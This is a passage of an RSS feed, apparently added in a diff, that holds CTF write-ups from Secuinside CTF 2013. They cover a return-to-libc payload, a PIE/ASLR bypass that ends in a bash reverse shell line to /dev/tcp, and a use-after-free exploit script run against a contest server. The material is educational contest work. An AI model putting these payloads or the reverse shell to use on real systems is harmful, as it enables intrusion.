+0012| 0xbffff64c --&amp;gt; 0xb7fff918 --&amp;gt; 0x0
+0016| 0xbffff650 --&amp;gt; 0x0
+0020| 0xbffff654 --&amp;gt; 0x0
+0024| 0xbffff658 --&amp;gt; 0x0
+0028| 0xbffff65c --&amp;gt; 0xbffff794 --&amp;gt; 0xbffff8b6 (&quot;/home/suto/reader&quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x58585858 in ?? ()
+&lt;/pre&gt;
+
+&lt;p&gt;As this is a local exploit, &lt;em&gt;“ulimit -s unlimited”&lt;/em&gt; trick will help to de-randomize libc and a simple system(“sh”) will work. Payload:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;system = 0x4006b280
+sh = 0x8048366
+payload = &quot;xff&quot; + &quot;SECUINSIDE&quot; + &quot;x00&quot; + &quot;Ax00&quot;+&quot;A&quot;*26 +&quot;CCCC&quot; + &quot;B&quot;*(100-4-28) +&quot;xff&quot;*4
+         + &quot;x08x00x00x00&quot;
+         + &quot;x08x00x00x00&quot;
+         + &quot;x32x00x00x00&quot;
+         + &quot;x00x00x00x00&quot;
+         + &quot;A&quot;*37 # padding
+         + struct.pack(&quot;&amp;lt;L&quot;, system) + struct.pack(&quot;&amp;lt;L&quot;, -1) + struct.pack(&quot;&amp;lt;L&quot;, sh)
+fd = open(&quot;test.sec&quot;,&quot;w&quot;)
+fd.write(payload)
+fd.close()
+&lt;/pre&gt;
+</description>
+        <pubDate>Wed, 29 May 2013 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/29/secuinside-ctf-2013-reader-writeup.html</link>
+        <guid isPermaLink="true">http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/29/secuinside-ctf-2013-reader-writeup.html</guid>
+        
+        <category>CLGT</category>
+        
+        <category>CTF</category>
+        
+        <category>return-to-libc</category>
+        
+        
+        <category>ctf - clgt crew</category>
+        
+      </item>
+    
+      <item>
+        <title>[Secuinside CTF 2013] pwnme writeup</title>
+        <description>&lt;p&gt;Challenge summary:&lt;/p&gt;
+
+&lt;p&gt;Binary : http://war.secuinside.com/files/pwnme&lt;br /&gt;
+Source : http://war.secuinside.com/files/pwnme.c&lt;br /&gt;
+===================================&lt;br /&gt;
+OS : Ubuntu 13.04 with PIE+ASLR+NX&lt;br /&gt;
+md5 of libc-2.17.so : 45be45152ad28841ddabc5c875f8e6e4&lt;/p&gt;
+
+&lt;p&gt;IP : 54.214.248.68&lt;br /&gt;
+PORT : 8181,8282,8383&lt;/p&gt;
+
+&lt;p&gt;This is the only exploit challenge comes with source. The bug is simple: buffer overflow with only 16-bytes at &lt;em&gt;pwnme.c:67&lt;/em&gt;, just enough to control EIP. The goal is to bypass PIE+ASLR+NX. We first thought about information leak by overwriting one byte of saved EIP and looking for status. Unfortunately, this way soon becomes an dead end as socket was closed before returning at &lt;em&gt;pwnme.c:72&lt;/em&gt;, so no more input, output can be provided to the program. Conclusion: we have to bruteforce for useful addresses, and due to binary is PIE bruteforcing for libc address the best way for code reuse. Luckily, ASLR on Ubuntu x86 is weak, the libc base address looks like 0xb7NNN000 with only 12-bits randomization. Server daemon will fork a child process for every coming connection, that means addresses will be the same for all instances and bruteforcing 12-bits only take 4096 tries at max. If server is fast, stable this can be done in few minutes, but in fact CTF game server was out of service for most of the time :).&lt;/p&gt;
+
+&lt;p&gt;Now we can assume that libc is at fixed address, let build the payload. But where is my input buffer? It was zeroing out at &lt;em&gt;pwnme.c:71&lt;/em&gt;, there must be something hidden. Let take a look at crash by sending a 1040 bytes pattern buffer:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0xb774b000 --&amp;gt; 0x1aed9c
+ECX: 0x0
+EDX: 0xb774b000 --&amp;gt; 0x1aed9c
+ESI: 0x0
+EDI: 0x0
+EBP: 0x41397441 ('At9A')
+ESP: 0xbfac6ce0 --&amp;gt; 0x1
+EIP: 0x75417375 ('usAu')
+EFLAGS: 0x10217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x75417375
+[------------------------------------stack-------------------------------------]
+0000| 0xbfac6ce0 --&amp;gt; 0x1
+0004| 0xbfac6ce4 --&amp;gt; 0xbfac6d74 --&amp;gt; 0xbfac78db (&quot;./pwnme&quot;)
+0008| 0xbfac6ce8 --&amp;gt; 0xbfac6d7c --&amp;gt; 0xbfac78e3 (&quot;TERM=xterm&quot;)
+0012| 0xbfac6cec --&amp;gt; 0xb777a000 --&amp;gt; 0x20f38
+0016| 0xbfac6cf0 --&amp;gt; 0x20 (' ')
+0020| 0xbfac6cf4 --&amp;gt; 0x0
+0024| 0xbfac6cf8 --&amp;gt; 0xb77566f0 --&amp;gt; 0xb759c000 --&amp;gt; 0x464c457f
+0028| 0xbfac6cfc --&amp;gt; 0x3
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x75417375 in ?? ()
+gdb-peda$ patts
+Registers contain pattern buffer:
+EIP+0 found at offset: 1036
+EBP+0 found at offset: 1032
+No register points to pattern buffer
+Pattern buffer found at:
+0xb7753000 : offset 1016 - size   24 (mapped)
+0xb7753023 : offset   27 - size  989 (mapped)
+0xbfac6cd0 : offset 1024 - size   16 ($sp + -0x10 [-4 dwords])
+References to pattern buffer found at:
+0xb774ba24 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba28 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba2c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba30 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba34 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba38 : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xb774ba3c : 0xb7753000 (/lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so)
+0xbfac6210 : 0xb7753000 ($sp + -0xad0 [-692 dwords])
+0xbfac6224 : 0xb7753000 ($sp + -0xabc [-687 dwords])
+0xbfac6248 : 0xb7753000 ($sp + -0xa98 [-678 dwords])
+0xbfac6254 : 0xb7753000 ($sp + -0xa8c [-675 dwords])
+0xbfac6294 : 0xb7753000 ($sp + -0xa4c [-659 dwords])
+0xbfac67c8 : 0xb7753000 ($sp + -0x518 [-326 dwords])
+0xbfac67d4 : 0xb7753000 ($sp + -0x50c [-323 dwords])
+0xbfac6814 : 0xb7753000 ($sp + -0x4cc [-307 dwords])
+gdb-peda$
+&lt;/pre&gt;
+
+&lt;p&gt;Our input buffer is still there in non-stack memory starts at 0xb7753000, actually this is “stdout” buffer used in &lt;em&gt;printf()&lt;/em&gt; at &lt;em&gt;pwnme.c:70&lt;/em&gt;.&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;gdb-peda$ info symbol 0xb7753000
+No symbol matches 0xb7753000.
+gdb-peda$ info symbol 0xb774ba24
+_IO_2_1_stdout_ + 4 in section .data of /lib/i386-linux-gnu/tls/i686/nosegneg/libc.so.6
+&lt;/pre&gt;
+
+&lt;p&gt;We can only assume that libc is fixed, if above buffer address is randomized things will become worse (means finding tedious ROP gadgets to pivot). Fortunately, that buffer is at fixed offset related to libc address.&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;gdb-peda$ vmmap libc
+Start      End        Perm    Name
+0xb759c000 0xb7749000 r-xp    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
+0xb7749000 0xb774b000 r--p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
+0xb774b000 0xb774c000 rw-p    /lib/i386-linux-gnu/tls/i686/nosegneg/libc-2.17.so
+gdb-peda$ distance 0xb759c000 0xb7753000
+From 0xb759c000 to 0xb7753000: 1798144 bytes, 449536 dwords
+&lt;/pre&gt;
+
+&lt;p&gt;Try to run the program several times to check and the offset is unchanged. We can build the payload now, the simplest one is calling &lt;em&gt;system()&lt;/em&gt; with bash reverse shell, or you can try harder with full ROP payload (like what we did during the contest and wasted few more hours :)).&lt;/p&gt;
+
+&lt;p&gt;Sample payload will look like:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: plain; title: ; notranslate&quot; title=&quot;&quot;&gt;base = 0xb7500000 + bruteforce_value
+target = base + 1798144 + 0x304 # make enough space for fake stack
+cmd_ptr = target + some_offset # calculate it yourself
+cmd = &quot;bash -c 'exec &amp;gt;/dev/tcp/127.127.127.127/4444 0&amp;lt;&amp;amp;1';&quot;
+payload = [ret ... ret, system, exit, cmd_ptr, cmd, padding] # total size = 1032
+payload += [target] # will become EBP
+payload += [leave_ret] # stack pivoting
+&lt;/pre&gt;
+
+&lt;p&gt;Run it hundred of times and wait for a shell coming to your box.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 28 May 2013 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html</link>
+        <guid isPermaLink="true">http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/28/secuinside-ctf-2013-pwnme-writeup.html</guid>
+        
+        <category>aslr</category>
+        
+        <category>CTF</category>
+        
+        <category>CTF - CLGT Crew</category>
+        
+        <category>return-to-libc</category>
+        
+        <category>rop</category>
+        
+        
+        <category>ctf - clgt crew</category>
+        
+      </item>
+    
+      <item>
+        <title>[Secuinside CTF 2013]Trace Him Writeup</title>
+        <description>&lt;p&gt;&lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;Description:&lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt; &lt;/span&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;IP : 59.9.131.155&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;port : 18562 (SSH)&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;account :  control  / control porsche&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;binary : http://war.secuinside.com/files/firmware&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;data : http://war.secuinside.com/files/car.bin&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;(To prevent meaningless waste of time on certain analysis, car.bin is open to public.)&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;hint :&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;root@ubuntu:~# uname -a&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;Linux ubuntu 3.8.0-19-generic #29-Ubuntu SMP Wed Apr 17 18:19:42 UTC 2013 i686 i686 i686 GNU/Linux&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;The evil group is running away by a car who stole personal information of BHBank.&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;The car has feature that you could do like &amp;#8220;remote desktop.&amp;#8221;&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;div style=&quot;width: 1px;height: 1px;overflow: hidden&quot;&gt;
+  &lt;em&gt;&lt;span style=&quot;text-decoration: underline&quot;&gt;You can find a vulnerability and stop the car. Get the evil!&lt;/span&gt;&lt;/em&gt;
+&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;IP : 59.9.131.155&lt;/p&gt;
+
+  &lt;p&gt;port : 18562 (SSH)&lt;/p&gt;
+
+  &lt;p&gt;account :  control  / control porsche&lt;/p&gt;
+
+  &lt;p&gt;binary : http://war.secuinside.com/files/firmware&lt;/p&gt;
+
+  &lt;p&gt;data : http://war.secuinside.com/files/car.bin&lt;/p&gt;
+
+  &lt;p&gt;(To prevent meaningless waste of time on certain analysis, car.bin is open to public.)&lt;/p&gt;
+
+  &lt;p&gt;hint :&lt;/p&gt;
+
+  &lt;p&gt;root@ubuntu:~# uname -a&lt;/p&gt;
+
+  &lt;p&gt;Linux ubuntu 3.8.0-19-generic #29-Ubuntu SMP Wed Apr 17 18:19:42 UTC 2013 i686 i686 i686 GNU/Linux&lt;/p&gt;
+
+  &lt;p&gt;The evil group is running away by a car who stole personal information of BHBank.&lt;/p&gt;
+
+  &lt;p&gt;The car has feature that you could do like “remote desktop.”&lt;/p&gt;
+
+  &lt;p&gt;You can find a vulnerability and stop the car. Get the evil!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;When login to with ssh credential provided, we’ll get a car’s control interface look like:&lt;br /&gt;
+&lt;img class=&quot;alignnone&quot; src=&quot;http://img441.imageshack.us/img441/9483/74587496.png&quot; alt=&quot;&quot; width=&quot;457&quot; height=&quot;800&quot; /&gt;&lt;br /&gt;
+Using arrow keys to mov “O” around. Now look at the binary we can know how to control this car.&lt;br /&gt;
+Go to sub_804B01C function we can see a simple switch/case looks like:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;switch ( recvChr )
+    {
+    case '1':
+     ..........
+    case '2':
+     .........
+    case 'A':
+     .......
+    case 'B':
+     .......
+    case 'D':
+     .......
+    case 'C':
+     .......
+    case ' ':
+     .......
+    default:
+}
+&lt;/pre&gt;
+
+&lt;p&gt;Using these keys we can playing with feature that interface provided. When navigate the “O” to the “@” position,press [SPACE] , it will provide 3 options look like:&lt;br /&gt;
+&lt;img class=&quot;alignnone&quot; src=&quot;http://img7.imageshack.us/img7/1090/54551606.png&quot; alt=&quot;&quot; width=&quot;384&quot; height=&quot;800&quot; /&gt;&lt;br /&gt;
+Let go to the binary and find out how it implemented. Take a look at function sub_0804902B:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;obj_1 = (obj_1 *)malloc(52u);
+  memset(obj_1, 0, 0x34u);
+  obj_1-&amp;gt;indi = '+';
+  obj_1-&amp;gt;flag_1 = 12;
+  obj_1-&amp;gt;flag_2 = 5;
+  obj_1-&amp;gt;flag_3 = 8;
+  obj_1-&amp;gt;handle = (int)f_handle;
+  obj_1-&amp;gt;window = (int)&amp;amp;obj_1-&amp;gt;case1;
+  obj_1-&amp;gt;case1 = (int)case1_1;
+  obj_1-&amp;gt;case2 = (int)case1_2;
+  obj_1-&amp;gt;case3 = (int)case1_3;
+  obj_1-&amp;gt;str1 = (int)&amp;nLockDoor;
+  obj_1-&amp;gt;str2 = (int)&amp;unLockDoor;
+  obj_1-&amp;gt;str3 = (int)&amp;Detach;
+  obj_1-&amp;gt;str4 = (int)&amp;off_804D094;
+&lt;/pre&gt;
+
+&lt;p&gt;Here I have created a struct for that obj, we can clearly see it creates 5 obj which is corresponding to  5 positions with “@”. When navigating the “O” to a position with “@” and press [SPACE] it will be proceeded in switch/case we have seen above:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;case ' ':
+        if ( curPos == '@' )
+        {
+          mvwprintw(v15, 8, 5, &quot;%x %x %x %x&quot;, v4, v5);
+          wrefresh(v15);
+          if ( var_window )
+            v4 = var_window-&amp;gt;_cury;&amp;lt;/code&amp;gt;
+          else
+            v4 = -1;
+          if ( var_window )
+            v5 = var_window-&amp;gt;_curx;
+          else
+            v5 = -1;
+          do_f_((int)var_window, v15, v9, v4, v5);
+          v12 = 1;
+        }
+        break;
+&lt;/pre&gt;
+
+&lt;p&gt;Take a look at function do_f_:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;if ( a3 == '@' )
+  {
+    for ( i = 0; i &amp;lt;= 5; ++i )
+    {
+      v8 = *(&amp;amp;gObject_array + i);
+      if ( cury - 1 == (char)v8-&amp;gt;flag_1 &amp;amp;&amp;amp; (char)v8-&amp;gt;flag_2 == curx )
+      {
+        indi = (char)v8-&amp;gt;indi;
+        break;
+      }
+    }
+&lt;/pre&gt;
+
+&lt;p&gt;First the code will loop through 5 objects and check if the object-&amp;gt;flag1 and object-&amp;gt;flag2 are correct, if matched it will set current object to that address. Something weird here can be abused: if there is memory with correct flag1 and flag2, the code will blindly accept it as an valid object.&lt;br /&gt;
+Next part of code is calling the handle function in object with specific parameters:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;switch ( indi )
+    {
+      case '+':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;amp;gObject_array + i))-&amp;gt;handle)(
+                   (*(&amp;amp;gObject_array + i))-&amp;gt;window,
+                   *(&amp;amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      case ',':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;amp;gObject_array + i))-&amp;gt;handle)(
+                   (*(&amp;amp;gObject_array + i))-&amp;gt;window,
+                   *(&amp;amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      case '-':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;amp;gObject_array + i))-&amp;gt;handle)(
+                   (*(&amp;amp;gObject_array + i))-&amp;gt;window,
+                   *(&amp;amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      case '.':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;amp;gObject_array + i))-&amp;gt;handle)(
+                   (*(&amp;amp;gObject_array + i))-&amp;gt;window,
+                   *(&amp;amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      case '/':
+        result = ((int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))(*(&amp;amp;gObject_array + i))[2].flag_3)(
+                   (*(&amp;amp;gObject_array + i))[1].indi,
+                   *(&amp;amp;gObject_array + i),
+                   a1,
+                   a2);
+        break;
+      default:
+        return result;
+    }
+&lt;/pre&gt;
+
+&lt;p&gt;So now the time to go to handle function and see what happen there:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;v8 = *(void (__cdecl **)(_DWORD, _DWORD))a2[13];
+  v9 = *(void (__cdecl **)(_DWORD, _DWORD))(a2[13] + 4);
+  v10 = *(void (__cdecl **)(_DWORD, _DWORD))(a2[13] + 8);
+_ch = (char)wgetch(a4);
+  switch ( _ch )
+  {
+    case '2':
+      v9(a3, a4);
+      break;
+    case '3':
+      v10(a3, a4);
+      break;
+    case '1':
+      v8(a3, a4);
+      break;
+    default:
+      mvwprintw(a4, 12, 1, &quot;Wrong&quot;);
+      wrefresh(a4);
+      break;
+  }
+&lt;/pre&gt;
+
+&lt;p&gt;v8,v9,v10 is function pointer case1,case2,case3 to handle user’s choice. Take a quick look at all functions that handle user’s choice, I found the interesting one is all “Detach” functions share the same code that frees the object but not clear the pointer in object_array.&lt;br /&gt;
+And another bug introduced in binary was out of bounds read/write. I will let u find that one, it makes me confuse a little bit about attack vector and finally I do something like:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Free an object to get a “dangling pointer” in object_array (make sure it is not the last one in object_array).  &lt;/li&gt;
+  &lt;li&gt;Reallocate that pointer with string we can control the content (so we can fool program with fake indi( “+”,”.”,”,”,”/” ) and fake flag1,flag2.  &lt;/li&gt;
+  &lt;li&gt;Trigger the handle function, when it loops through the object_array it will think our fake object is correct object, then calls the handle function of that object via offset  &lt;/li&gt;
+  &lt;li&gt;41414141 ( Kab00m)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;To visualize the exploit steps, here is the object_array during exploitation:&lt;br /&gt;
+0x804d380:&lt;br /&gt;
+[Door Object Pointer][Rapair Object Pointer][Front Missle Object Pointer][Rare Object Pointer][Rear Object Pointer]&lt;/p&gt;
+
+&lt;p&gt;*First we Detach Front Missle Object Pointer so it will become:&lt;br /&gt;
+0x804d380:&lt;br /&gt;
+[Door Object Pointer][Rapair Object Pointer][Pointer to Freed memory size 0x34][Rare Missle Object Pointer][Rear Object Pointer]&lt;br /&gt;
+&lt;img class=&quot;alignnone&quot; src=&quot;http://img191.imageshack.us/img191/3107/19012399.png&quot; alt=&quot;&quot; width=&quot;400&quot; height=&quot;800&quot; /&gt;&lt;br /&gt;
+*Reallocate that memory with Repair Object Comment so it will look like:&lt;br /&gt;
+[Door Object Pointer][Rapair Object Pointer][Pointer to Content ( AAAAAAAAAAA) ][Rare Missle Object Pointer][Rear Object Pointer]&lt;br /&gt;
+&lt;img class=&quot;alignnone&quot; src=&quot;http://img19.imageshack.us/img19/5749/89539837.png&quot; alt=&quot;&quot; width=&quot;380&quot; height=&quot;800&quot; /&gt;&lt;br /&gt;
+Of course in exploitation we will replace “AAAA…” with string looks like a correct Rare Object.&lt;/p&gt;
+
+&lt;p&gt;*Call Rare Missle Object handle function&lt;/p&gt;
+
+&lt;p&gt;Finally, exploit code :&lt;/p&gt;
+
+&lt;pre class=&quot;brush: python; title: ; notranslate&quot; title=&quot;&quot;&gt;from pexpect import spawn
+import time
+
+child = spawn('ssh -p 18562 control@59.9.131.155')
+child.expect('password')
+
+child.sendline('control porsche')
+#child = spawn(&quot;./por&quot;)
+
+KEY_UP = 'x1b[A'
+KEY_DOWN = 'x1b[B'
+KEY_RIGHT = 'x1b[C'
+KEY_LEFT = 'x1b[D'
+
+child.expect('Console')
+
+child.send(KEY_RIGHT * 9)
+child.send(KEY_DOWN * 2)
+child.send(&quot; 3&quot;)
+
+child.send(KEY_DOWN)
+child.send(KEY_LEFT * 6)
+child.send(&quot; 1&quot;)
+child.sendline(&quot;x2dx41x41x41&quot; +&quot;x06x01x01x01&quot; + &quot;x06x01x01x01&quot; + 'AAAAx6bx85x04x08'+&quot;C&quot;*28+&quot;x40x89x04x08&quot;)
+
+child.send(&quot; &quot;)
+
+child.sendline(&quot;echo 'cat /home/admin/StopTheCar'|./PrivilegeEscalation&quot;)
+
+child.interact()
+&lt;/pre&gt;
+
+&lt;p&gt;Actually, after getting the shell, I got a mini heart attack from organizer since the ReadMe file tells this is 2-steps challenge, it needs another local exploit. My team mate @w00d helped me to retrieve the PrivilegeEscalation binary, and it only does one thing:&lt;/p&gt;
+
+&lt;pre class=&quot;brush: cpp; title: ; notranslate&quot; title=&quot;&quot;&gt;int __cdecl sub_804844C()
+{
+  setreuid(0x3E8u, 0x3E8u);
+  return system(&quot;/bin/bash&quot;);
+}
+&lt;/pre&gt;
+
+&lt;p&gt;It really a nice challenge to work with, thanks organizer for awesome binaries, thank all you guys from CLGT CTF team &lt;img src=&quot;http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif&quot; alt=&quot;:)&quot; class=&quot;wp-smiley&quot; /&gt;&lt;br /&gt;
+See u in next CTF.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 27 May 2013 00:00:00 +0800</pubDate>
+        <link>http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/27/secuinside-ctf-2013trace-him-writeup.html</link>
+        <guid isPermaLink="true">http://localhost:8000/ctf%20-%20clgt%20crew/2013/05/27/secuinside-ctf-2013trace-him-writeup.html</guid>
+        
+        <category>CTF</category>
+        
+        <category>used after free</category>
+        
+        
+        <category>ctf - clgt crew</category>
+        
+      </item>
+    
+  </channel>
+</rss>
